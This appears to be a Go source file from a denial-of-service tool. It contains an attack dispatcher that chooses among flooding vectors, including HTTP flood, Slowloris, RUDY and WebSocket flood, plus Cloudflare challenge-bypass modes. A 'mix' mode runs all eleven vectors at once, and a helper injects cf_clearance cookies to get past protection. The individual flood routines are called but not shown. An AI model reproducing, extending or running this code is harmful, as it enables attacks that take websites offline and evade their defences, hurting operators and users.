package main

import (
	"fmt"
	"net/http"
	"net/url"
	"sync"
	"io"
)

func executeAttack() {
	fmt.Printf("[ATTACK] Method: %s | Threads: %d | Target: %s | Duration: %ds\n", cfg.attackType, cfg.threadCount, targetURL, cfg.durationSec)
	fmt.Printf("[BYPASS] HTTP/2=%v | TLS Session Cache=%v | Cookie Jar=%v | Think Time=%v\n",
		true, true, true, true)
	fmt.Printf("[BYPASS] UA Pool: %d | CF Bypass: %d | Headers: %d\n",
		len(userAgents), len(cfBypassUserAgents), len(cfBypassHeaders))
	if cfg.attackType == "STENLY_CFBYPASS" {
		fmt.Println("[STENLY] Premium CF Bypass v10 — buildRequest() HEAD 80% + GET 20% | Chrome TLS")
	}
	switch cfg.attackType {
	case "HEAVY_POST":
		executeHeavyPost()
	case "HEAVY_HEAD":
		executeHeavyHead()
	case "HEAVY_OPTIONS":
		executeHeavyOptions()
	case "HEAVY_HTTPFLOOD":
		executeHeavyHTTPFlood()
	case "HEAVY_SLOWLORIS":
		executeHeavySlowloris()
	case "HEAVY_RUDY":
		executeHeavyRUDY()
	case "HEAVY_WSFLOOD":
		executeHeavyWSFlood()
	case "HEAVY_MIX":
		executeHeavyMix()
	case "UAM_BYPASS":
		executeMixVectorUAMBypass(cfg.threadCount)
	case "CF_BOTFIGHT":
		executeMixVectorCFBotFight(cfg.threadCount)
	case "STENLY_CFBYPASS":
		executeMixVectorStenlyCFBypass(cfg.threadCount)
	default:
		executeHeavyGet()
	}
}

func executeHeavyMix() {
	fmt.Printf("[VECTOR] HEAVY MIX — ALL 10 VECTORS SIMULTANEOUSLY\n")
	fmt.Printf("[MIX] GET + POST + HEAD + OPTIONS + HTTPFLOOD + SLOWLORIS + RUDY + WSFLOOD + UAM_BYPASS + CF_BOTFIGHT + STENLY_CFBYPASS\n")
	fmt.Printf("[BYPASS] uTLS Chrome131 + HTTP/2 + TLS Session Cache + Cookie Jar + Think Time + CF Challenge Solver\n")

	threadsPerVector := cfg.threadCount / MIX_VECTORS_COUNT_NEW
	remainder := cfg.threadCount % MIX_VECTORS_COUNT_NEW
	vectorThreads := make([]int, MIX_VECTORS_COUNT_NEW)
	for i := 0; i < MIX_VECTORS_COUNT_NEW; i++ {
		vectorThreads[i] = threadsPerVector
	}
	for i := 0; i < remainder; i++ {
		vectorThreads[i%len(vectorThreads)]++
	}

	fmt.Printf("[MIX] Thread distribution: GET=%d POST=%d HEAD=%d OPT=%d HTTP=%d SLOW=%d RUDY=%d WS=%d UAM=%d BOT=%d STENLY=%d\n",
		vectorThreads[0], vectorThreads[1], vectorThreads[2], vectorThreads[3],
		vectorThreads[4], vectorThreads[5], vectorThreads[6], vectorThreads[7],
		vectorThreads[8], vectorThreads[9], vectorThreads[10])

	var totalWg sync.WaitGroup
	for vi := 0; vi < MIX_VECTORS_COUNT_NEW; vi++ {
		vectorIdx := vi
		tcount := vectorThreads[vi]
		if tcount <= 0 {
			continue
		}
		totalWg.Add(1)
		go func() {
			defer totalWg.Done()
			switch vectorIdx {
			case 0:
				executeMixVectorGet(tcount)
			case 1:
				executeMixVectorPost(tcount)
			case 2:
				executeMixVectorHead(tcount)
			case 3:
				executeMixVectorOptions(tcount)
			case 4:
				executeMixVectorHTTPFlood(tcount)
			case 5:
				executeMixVectorSlowloris(tcount)
			case 6:
				executeMixVectorRUDY(tcount)
			case 7:
				executeMixVectorWSFlood(tcount)
			case 8:
				executeMixVectorUAMBypass(tcount)
			case 9:
				executeMixVectorCFBotFight(tcount)
			case 10:
				executeMixVectorStenlyCFBypass(tcount)
			}
		}()
	}
	totalWg.Wait()
}

func ioReadAll(r io.Reader) ([]byte, error) {
	return io.ReadAll(r)
}

func applyCFStoreCookies(utlsClient *http.Client, host, targetURL string) {
	entry := cfStore.Get(host)
	if entry == nil {
		return
	}
	utlsClient.Jar = newCookieJar()
	u, _ := url.Parse(targetURL)
	cookies := []*http.Cookie{}
	if entry.clearance != "" {
		cookies = append(cookies, &http.Cookie{Name: "cf_clearance", Value: entry.clearance, Domain: host, Path: "/"})
	}
	if entry.cfBm != "" {
		cookies = append(cookies, &http.Cookie{Name: "__cf_bm", Value: entry.cfBm, Domain: host, Path: "/"})
	}
	utlsClient.Jar.SetCookies(u, cookies)
}
